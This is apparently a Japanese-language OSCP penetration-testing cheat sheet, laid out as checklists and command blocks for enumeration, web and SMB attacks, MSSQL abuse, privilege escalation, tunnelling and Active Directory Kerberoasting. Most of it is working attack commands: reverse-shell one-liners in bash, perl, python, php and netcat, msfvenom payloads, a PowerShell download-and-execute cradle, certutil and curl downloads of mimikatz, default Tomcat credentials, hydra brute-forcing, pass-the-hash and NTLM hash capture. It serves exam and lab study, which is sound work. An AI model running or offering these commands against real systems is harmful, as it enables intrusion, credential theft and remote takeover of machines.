# FootHold(Enumeration,Exploit)

## チェックリスト

### 初期

- [ ] autorecon
- [ ] nmap Top1000
- [ ] nmap AllPort

### 80,443,web

- [ ] nikto
- [ ] gobuster
- [ ] robots.txt
- [ ] form がある際のインジェクションの確認
- [ ] OS コマンドインジェクションの確認
- [ ] LFI
- [ ] RFI
- [ ] wpscan
- [ ] hydra

### 139,445,smb

- [ ] anonymous,guest,null login
- [ ] eternalblue

### 21 FTP

- [ ] anonymous login
- [ ] FTP BINARY MODE(ファイル化け防止)

## autorecon

自動でよしなに各ポート/サービスをスキャンする。依存すると取りこぼしが多くなる。

```
autorecon <IP>
```

## Nmap(Port Scan)

最初期のオープンポートスキャン

- Top 1000 Port
    
    ```
    nmap -Pn -n -vvv -sV -oN nmap_initial <IP>
    ```
    
- All Port
    
    ```
    nmap -Pn -n -vvv -p- -sV -oN nmap_allports <IP>
    ```
    
- SYN スキャン
    
    ```
    sudo nmap -vv -sS -p 1-65535 -Pn -oN nmap_syn <IP>
    ```
    
- UDP ポートスキャン
    
    ```
    sudo nmap -v -p- -Pn -sU --open -oN nmap_udp <IP>
    ```
    
- サービス列挙基本スクリプト実行
    
    ```
    sudo nmap -v -sS -Pn -sC -sV -p <open ports> -oN nmap_base_script <IP>
    ```
    

## searchsploit

```
#基本検索。マイナーバージョンで引っかからない場合はメジャーバージョンで検索
searchsploit <ServiceName> [Version]

#PoCをlessコマンドで参照
searchsploit -x </path/to/exploit>

#PoCをカレントディレクトリにコピー
searchsploit -m </path/to/exploit>

```

空いているポート/動作しているサービスによって追加の調査を行う。

## Port 80,443(HTTP, HTTPS)

ブラウザ(開発者ツール,Ctrl+u)/burp での挙動確認と並行して行う。

### nikto(web の網羅的なスキャン)

```
nikto -h <URL>
```

### gobuster(web ディレクトリ調査)

```
gobuster dir -u <URL> -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 10 -x <extension> -o gobuster_result
```

### gobuster(proxy)

```
HTTP_PROXY="sock5://127.0.0.1:1080/" gobuster dir -u <URL> -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 10 -x <extension> -o gobuster_result_proxy
```

### dirb(web ディレクトリ調査)

```
dirb <url>
```

### fuzzing(パスのファジング。LFI や RFI の検証にも使える)

```
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u <URL>/FUZZ -e .php,.txt
```

### feroxbuster(web ディレクトリ調査)

```
feroxbuster --url <URL> --depth 2 --wordlist <wordlist>
```

### 認証画面等に対する SQL インジェクションの検証

```
https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection
https://sushant747.gitbooks.io/total-oscp-guide/content/sql-injections.html
```

### OS コマンドインジェクションの検証

```
https://cobalt.io/blog/a-pentesters-guide-to-command-injection
https://github.com/payloadbox/command-injection-payload-list
```

### LFI, Path Traversal

```
http://example.com/index.php?page=../../../../../../etc/passwd
```

php-execution-bypass

```
http://example.com/index.php?page=php://filter/convert.base64-encode/resource=index
```

有効なファイル一覧

```
# Windows
https://github.com/danielmiessler/SecLists/blob/master/Fuzzing/LFI/LFI-gracefulsecurity-windows.txt

#Linux
https://github.com/danielmiessler/SecLists/blob/master/Fuzzing/LFI/LFI-gracefulsecurity-linux.txt
```

### cewl(web ページからワードリストの作成ができる)

```
cewl <URL>
```

### hydra(ブルートフォースによる認証)

```
#POST ":"以降は各アプリケーションの認証時のペイロードによって変わる。コマンドをミスると時間を浪費して悲惨なことになる。
hydra -l <USER> -P <PASSWORDS_LIST> <IP> http-post-form "/webapp/login.php:username=^USER^&password=^PASS^:Invalid" -t <THREADS_NUMBER>

#GET 同上
hydra <IP> -V -l <USER> -P <PASSWORDS_LIST> http-get-form "/login/:username=^USER^&password=^PASS^:F=Error:H=Cookie: safe=yes; PHPSESSID=12345myphpsessid" -t <THREADS_NUMBER>
```

### Wordpress

wpscan(wordpress に対するスキャン)

```
wpscan --url <URL> --enumerate ap,at,cd,dbe
```

hydra などでログインできた場合、以下手順で RCE

```
Appearance -> Editor -> 404 Template
/usr/share/webshells/php/php-reverse-shell.phpの内容をを404.phpにコピペ。テーマによって編集可能かどうかなど制限があったりするので、テーマを変えて試すのも良い。
最後に以下パスにアクセス。
http://<IP>/wp-content/themes/<theme eg:twentytwelve>/404.php
```

### WebDav

```
davtest -url <URL>
```

### Tomcat

デフォルトの認証情報

```
/manager/htmlなどが管理画面。HTTP認証。

admin:admin
tomcat:tomcat
admin:<NOTHING>
admin:s3cr3t
tomcat:s3cr3t
admin:tomcat
```

管理者画面からの RCE

```
#ペイロード作成
msfvenom -p java/jsp_shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f war > shell.war

#管理者画面でwarファイルをアップロード後、アクセス。
http://<IP>/shell
```

## Port 139,445 (SMB)

### バージョン調査

```
sudo ngrep -i -d tun0 's.?a.?m.?b.?a.*[[:digit:]]'
```

```
smbclient -L //<rhost> -U "" -N
```

### nmap による脆弱性調査

```
nmap -p139,445 --script "smb-vuln-* and not(smb-vuln-regsvc-dos)" --script-args smb-vuln-cve-2017-7494.check-version,unsafe=1 <IP>
```

### 手動チェック

```
smbmap -H <IP>
smbmap -u '' -p '' -H <IP>
smbmap -u 'guest' -p '' -H <IP>
smbmap -u '' -p '' -H <IP> -R
smbmap -u anonymous -p anonymous -H <IP>

enum4linux -a <IP>

smbclient --no-pass -L //<IP>
smbclient -L //<IP> -U anonymous
smbclient //<IP>/<SHARE>

#再帰的なファイルダウンロード
smbclient //<IP>/<SHARE> -U <USER> -c "prompt OFF;recurse ON;mget *"
```

### ブルートフォース

```
hydra -L <userdictionary> -P <passworddictionary> <IP> smb -u -vV
```

### SMB の認証情報を利用したシェルの入手

```
python3 ~/impacket/examples/psexec.py (<DOMAIN>/)<USER>:<PASSWORD>@<IP>

#PTH
python3 ~/impacket/examples/psexec.py -hashes <NTHASH>:<NTHASH> <USER>@<IP>
```

### EternalBlue(MS17-010)

```
#以下リポジトリのsend_and_execute.pyが使いやすい。
https://github.com/helviojunior/MS17-010
```

## PORT 21(FTP)

### anonymous login

```
ftp <IP>
User:anonymous
Password:anonymous
```

### Get File

```
ftp <IP>
PASSIVE
BINARY
get <FILE>
```

### Upload File

```
ftp <IP>
PASSIVE
BINARY
put <FILE>
curl -O http://192.168.119.243/mimikatz.exe
certutil.exe -urlcache -split -f "http://192.168.119.243:8000/mimikatz.exe"
```

## MSSQL (Port 1433)

### Brute Force

```
hydra -L <USERS_LIST> -P <PASSWORDS_LIST> <IP> mssql -vV -I -u
```

### 認証情報を使ったログイン、コマンド実行

```
mssqlclient.py -windows-auth <DOMAIN>/<USER>:<PASSWORD>@<IP>
mssqlclient.py <USER>:<PASSWORD>@<IP>

SQL> select @@ version;

# NTLM Hashの奪取
sudo smbserver.py -smb2support smb . #Kali側
SQL> exec master .. xp_dirtree '\\<IP>\smb\'

# コマンド実行。実行権限が割り当てられていなければ不可
SQL> xp_cmdshell whoami
SQL> <command>

# MSSQL 2005だとxp_cmdshellがデフォルトで無効になっていることが多いので、以下で有効化する
EXEC sp_configure 'show advanced options', 1;--
RECONFIGURE;-- 
EXEC sp_configure 'xp_cmdshell', 1;-- 
RECONFIGURE;--
```

### その他手動での MSSQL インジェクションのリソース

```
https://www.asafety.fr/mssql-injection-cheat-sheet/
```

## ほかInitialShell取得に使えそうなコマンド等

### Reverse Shell

#### socat

binary -> https://github.com/andrew-d/static-binaries
local

```
$ socat file:`tty`,raw,echo=0 tcp-listen:12345
```

remote

```
$ socat tcp-connect:$RHOST:$RPORT exec:/bin/bash,pty,stderr,setsid,sigint,sane
```

#### bash

```
bash -i >& /dev/tcp/[LHOST]/[LPORT] 0>&1
```

#### perl

```
perl -e 'use Socket;$i="[LHOST]";$p=[LPORT];socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```

#### netcat

```
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc [LHOST] [LPORT] >/tmp/f
```

```
nc -e /bin/sh [LHOST] [LPORT]
```

#### python

```
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("[LHOST]",[LPORT]));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

```
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("[LHOST]",[LPORT]));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

#### php

```
php -r '$sock=fsockopen("[LHOST]",[LPORT]);exec("/bin/sh -i <&3 >&3 2>&3");'
```

#### java

```
r = Runtime.getRuntime()
p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/[LHOST]/[LPORT];cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
p.waitFor()
```

```
msfvenom -p java/jsp_shell_reverse_tcp lhost=[LHOST] lport=[LPORT] -f raw > shell.jsp
```

#### msfvenom

Linux

```
msfvenom -p linux/x86/shell/reverse_tcp lhost=[LHOST] lport=[LPORT] -f elf > shell.elf // 32bit-staged
msfvenom -p linux/x86/shell_reverse_tcp lhost=[LHOST] lport=[LPORT] -f elf > shell.elf // 32bit-unstaged
msfvenom -p linux/x86/meterpreter/reverse_tcp lhost=[LHOST] lport=[LPORT] -f elf > shell.elf // 32bit-meterpreter
msfvenom -p linux/x64/shell/reverse_tcp lhost=[LHOST] lport=[LPORT] -f elf > shell.elf // 64bit-staged
msfvenom -p linux/x64/shell_reverse_tcp lhost=[LHOST] lport=[LPORT] -f elf > shell.elf // 64bit-unstaged
msfvenom -p linux/x64/meterpreter/reverse_tcp lhost=[LHOST] lport=[LPORT] -f elf > shell.elf // 64bit-meterpreter-staged
```

Windows

```
msfvenom -p windows/meterpreter/reverse_tcp lhost=[LHOST] lport=[LPORT] -f exe > shell.exe // 32bit-meterpreter-sataged
msfvenom -p windows/meterpreter_reverse_tcp lhost=[LHOST] lport=[LPORT] -f exe > shell.exe // 32bit-meterpreter-unsataged
msfvenom -p windows/shell/reverse_tcp lhost=[LHOST] lport=[LPORT] -f exe > shell.exe // 32bit-sataged
msfvenom -p windows/shell_reverse_tcp lhost=[LHOST] lport=[LPORT] -f exe > shell.exe // 32bit-unsataged
msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=[LHOST] lport=[LPORT] -f exe > shell.exe // 64bit-meterpreter-sataged
msfvenom -p windows/x64/meterpreter_reverse_tcp lhost=[LHOST] lport=[LPORT] -f exe > shell.exe // 64bit-meterpreter-unsataged
msfvenom -p windows/x64/shell/reverse_tcp lhost=[LHOST] lport=[LPORT] -f exe > shell.exe // 64bit-sataged
msfvenom -p windows/x64/shell_reverse_tcp lhost=[LHOST] lport=[LPORT] -f exe > shell.exe // 64bit-unsataged
```

### hash crack

#### hashcat

```
hashcat -m [type] hash /usr/share/wordlist/rockyou.txt // modeに関しては要確認 hashcat formatで検索
```

#### john

```
zip2john backup.zip > hash
ssh2john id_rsa > hash
john --wordlist=/usr/share/wordlist/rockyou.txt hash
```

# Privilege Escalation

## チェックリスト

### Linux

- [ ] whoami
- [ ] ls -al /home
- [ ] ls -al /etc/passwd, ls -al /etc/shadow
- [ ] cat /etc/passwd
- [ ] shell upgrade
- [ ] ls -al /opt,/tmp,/var/www/html
- [ ] config.php 等設定ファイルの認証情報奪取
- [ ] find コマンドで Web サーバーで使われている拡張子が置かれているディレクトリを探す
- [ ] linpeas
- [ ] les
- [ ] sudo -l
- [ ] suid
- [ ] pspy
- [ ] ls -al /etc/cron
- [ ] uname -a, cat /etc/issue
- [ ] netstat
- [ ] ps -aux
- [ ] kernel exploit

### Windows

- [ ] whoami /priv
- [ ] icacls /Users/Administrator
- [ ] dir /Users
- [ ] windows-exsploit-suggester
- [ ] winpeas
- [ ] netstat
- [ ] high priv running service
- [ ] unquated service path
- [ ] potato
- [ ] kernel exploit

## Port Forwarding

### Local Port Forwarding

```
ssh username@<remote-machine> -L localport:target-ip:target-port
ssh username@<Kali's IP> -L 5000:<Kali's IP>:5000
```

### Remort Port Forwarding

内部に開かれているポートを攻撃者のマシンへ転送する。

```
ssh -R 9090:localhost:8080 <Remote Host>
```

windows の場合は plink.exe を使う

```
plink.exe -l root -pw mysecretpassword 111.111.111.111 -R 3307:127.0.0.1:3306
```

### SShutle

(おそらく利用しない)
任意のホストを踏み台にして、サブネット内のマシンの公開ポートへアクセスできる。が、nmap の実行は厳しい

```
sshuttle -r root@192.168.1.101 192.168.1.0/24
```

### chisel

ファイアウォールも 53 番の DNS あたり使えばすり抜けられることが多い

```
#On Kali
./chisel server -p 8000 -reverse

#On Target
./chisel client <YOUR IP>:<YOUR CHISEL SERVER PORT> L/R:[YOUR LOCAL IP]:<TUNNEL LISTENING PORT>:<TUNNEL TARGET>:<TUNNEL PORT>

#e.g.
./chisel client 10.1.1.1:8000 R:127.0.0.1:8001:172.19.0.3:80
```

## Linux

### Shell Upgrade

```
# Enter while in reverse shell
$ python -c 'import pty; pty.spawn("/bin/bash")'

Ctrl-Z

# In Kali
$ stty raw -echo
$ fg

# In reverse shell
$ reset
$ export SHELL=bash
$ export TERM=xterm-256color
$ stty rows <num> columns <cols>


#Resource
https://netsec.ws/?p=337
```

### linpeas

```
https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS
```

### lse

```
#TODO: Option覚える
https://github.com/diego-treitos/linux-smart-enumeration
```

### SUID,SGID

```
#SUID
find / -perm -u=s -type f 2>/dev/null
#SGID
find / -perm -g=s -type f 2>/dev/null
```

### ファイル調査

```
find / -type f  -name "*.<phpなど任意の拡張子>" 2>/dev/null
```

## Windows

### OS バージョン等の確認

```
systeminfo
hostname
```

### ユーザー確認

```
whoami
echo %username%
```

### ユーザー/グループの確認

```
net users
net localgroups
net user username
```

### ドメイングループの確認

```
net group /domain
net group /domain <Group Nmae>
```

### ネットワーク確認

```
ipconfig /all
route print
arp -A
```

### ユーザーの権限確認

```
whoami /priv
```

### whoami /priv コマンドの出力で使える権限たち

```
SeImpersonatePrivilege > Juicy Potatoが悪用している
SeAssignPrimaryPrivilege > 同上
SeBackupPrivilege > samやsystemからhashを抜き取れる
SeRestorePrivilege > サービスのバイナリ上書きしたりdll上書きしたりレジストリを上書きしたり
SeTakeOwnershipPrivilege > SeRestorePrivilegeと同じ悪用が可能
SeTcbPrivilege, SeCreateTokenPrivilege, SeLoadDriverPrivilege, SeDebugPrivilege
```

### PowerView.ps1 - linpeas 的なもの

```
import-module .\\PowerView.ps1
invoke-allchecks
```

### wmic - unquoted service path を見つけるのに役立つ

```
wmic service get name,displayname,pathname,startmode |findstr /i "auto"|findstr /i /v "c:\windows"
icacls "[path]"
```

### sc.exe - サービスに関する問い合わせ

```
sc.exe query | findstr "SERVICE_NAME" // サービス一覧
sc.exe qc <name> // サービスの設定
sc.exe query <name> // サービスの現在の状況
sc.exe config <name> <option>=<value> // 設定変更
net start(stop) <name> // サービスのスタート(ストップ)
```

### reg - regstry の設定を確認

```
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run //AutoRuns
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated //AlwaysInstallElevated
reg query HKLM /f password /t REG_SZ /s //レジストリにパスワードが平文で保存されていないか
reg query HKCU /f password /t REG_SZ /s //同上
```

### パスワードを探すのを助けてくれるコマンドたち

```
cmdkey /list //パスワードが保存されていないか
dir /s *pass* == *.config //パスワードが保存されていそうなファイルを列挙
findstr /si password *.xml *.ini *.txt //同上
```

### tasks - タスクに関連して

```
schtasks /query /fo LIST /v //定期的に行われるタスクを列挙
tasklist /v
```

# Active Directory

ドメインユーザーの表示

```
net user /domain 
```

ドメインユーザーの詳細表示

```
net user <username> /domain
```

ドメイングループの表示

```
net group /domain
```

powershellの実行ポリシーバイパス

```
set-ExecutionPolicy unrestricted
```

windows file転送

```
certutil -urlcache -f http://ip/1.exe 1.exe
```

nc ファイル転送
https://gist.github.com/jtbonhomme/50e381f053f6cd0acdb8

### PowerView

```
set-ExecutionPolicy unrestricted
Import-Module ./PowerView.ps1
```

現在ログインしているユーザーの列挙

```
Get-NetLoggedon -ComputerName <ComputerName>
```

現在有効なセッション

```
Get-NetSession -ComputerName <ComputerName>
```

spn列挙→ドメイン把握

```
set-ExecutionPolicy unrestricted
./spnEnum.ps1
nslookup <serviceprincipalname>
```

mimikatz
https://book.hacktricks.xyz/windows/stealing-credentials

サービスチケットの要求

```
Add-Type -AssemblyName System.IdentityModel
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList '<spnname>'
```

サービスチケットダウンロード(mimikatz.exe)

```
mimikatz.exe 'kerberos::list /export'

(kali)
python /usr/share/kerberoast/tgsrepcrack.py wordlist.txt 1-40a50000-Offsec@HTTP~CorpWebServer.corp.com-CORP.COM.kirbi

```

Invoke-Keroberoast

```
https://github.com/EmpireProject/Empire/blob/master/data/module_source/credentials/Invoke-Kerberoast.ps1
https://medium.com/@markmotig/kerberoasting-from-setup-to-cracking-3e8c980f26e8


powershell.exe -NoP -NonI -Exec Bypass IEX (New-Object Net.WebClient).DownloadString('http://<IP>/Invoke-Kerberoast.ps1');Invoke-Kerberoast -erroraction silentlycontinue -OutputFormat Hashcat

(kaliでhashをまとめたテキストファイル作成後)
hashcat -m 13100 krb5gts.txt  /usr/share/wordlists/rockyou.txt
```

importkeyエラーがでたとき、古いバージョンのmimikatz使えば解決できる。
https://gitlab.com/kalilinux/packages/mimikatz/-/blob/d72fc2cca1df23f60f81bc141095f65a131fd099/x64/mimikatz.exe

各コンピュータをnmapすれば名前やドメインはわかる。

[https://www.reddit.com/r/oscp/comments/jmp7nw/looking\_for\_snippet\_tool\_recommendations/](https://www.reddit.com/r/oscp/comments/jmp7nw/looking_for_snippet_tool_recommendations/)

# Useful Resources

## Useful Tools

- https://falconspy.medium.com/unofficial-oscp-approved-tools-b2b4e889e707

## Linux PrivEsc

- https://0xsp.com/offensive/privilege-escalation-cheatsheet
- https://book.hacktricks.xyz/linux-unix/privilege-escalation
- [https://sushant747.gitbooks.io/total-oscp-guide/content/privilege\_escalation\_-_linux.html](https://sushant747.gitbooks.io/total-oscp-guide/content/privilege_escalation_-_linux.html)

## Windows PrivEsc

- https://0xsp.com/offensive/privilege-escalation-cheatsheet
- [https://sushant747.gitbooks.io/total-oscp-guide/content/privilege\_escalation\_windows.html](https://sushant747.gitbooks.io/total-oscp-guide/content/privilege_escalation_windows.html)
- https://book.hacktricks.xyz/windows/windows-local-privilege-escalation

## Unquated Service Path

- https://medium.com/@SumitVerma101/windows-privilege-escalation-part-1-unquoted-service-path-c7a011a8d8ae

## Windows Credential Dump

- https://pure.security/dumping-windows-credentials/
- https://book.hacktricks.xyz/windows/stealing-credentials

## GTFOBins

- [https://gtfobins.github.io/#](https://gtfobins.github.io/ "https://gtfobins.github.io/#")

## Windows Path Traversal

- https://web.archive.org/web/20210307024319/https://gracefulsecurity.com/path-traversal-cheat-sheet-windows/
- /usr/share/seclists/Fuzzing/LFI/LFI-gracefulsecurity-windows.txt

## OSCP Exam Update

- https://help.offensive-security.com/hc/en-us/articles/4412170923924-OSCP-Exam-Update-01-11-22-FAQ

## Windows XP SP0/SP1 Privilege Escalation to System

- https://sohvaxus.github.io/content/winxp-sp1-privesc.html

## Postfix Shellshock PoC Testing

- https://gist.github.com/claudijd/33771b6c17bc2e4bc59c

## Union Based Oracle Injection

- http://securityidiots.com/Web-Pentest/SQL-Injection/Union-based-Oracle-Injection.html


---
---
---
## rlwrap
rlwrap コマンドは、行入力においてヒストリ機能などがないコマンドに、readline 相当の
機能を後付けする wrapper コマンドである。これにより、Ctrl-a で行頭移動・Ctrl-p でヒストリをさかのぼる、といったことが簡単に実現できる   
## Windows ビット確認
```
wmic os get osarchitecture
```